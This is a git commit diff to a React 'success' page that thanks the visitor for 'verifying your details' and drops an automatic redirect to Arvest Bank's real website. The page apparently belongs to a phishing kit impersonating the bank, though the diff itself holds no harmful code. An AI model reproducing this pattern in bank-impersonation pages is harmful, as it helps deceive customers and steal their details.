a151a4e3a47b89b5d7c128c2974695884bb0ffc0
unknown <gdee85669@gmail.com>
2024-05-23 12:03:58 -0400

    update

--- src/pages/success.tsx
+++ src/pages/success.tsx
@@ -1,15 +1,6 @@
-import { useEffect } from 'react'
 import { Link } from 'react-router-dom'
-import { wait } from '../utils/waiter'
-
 export default function Success() {
-  const Redirect = () =>{
-    wait(4000);
-    window.location.replace("https://www.arvest.com")
-  }
-  useEffect(()=>{
-    Redirect();
-  }, [])
+ 
   return (
     <div>
         <div style={{textAlign:"center"}}>
@@ -18,7 +9,7 @@ export default function Success() {
           Thank you for verifying your details with us, You'll be redirected
             to the home page.
           </p>
-          <Link to={"https://www.arvest.com"}>Go home</Link>
+          <Link to={"/"} target="_blank">Go home</Link>
         </div>
     </div>
   )
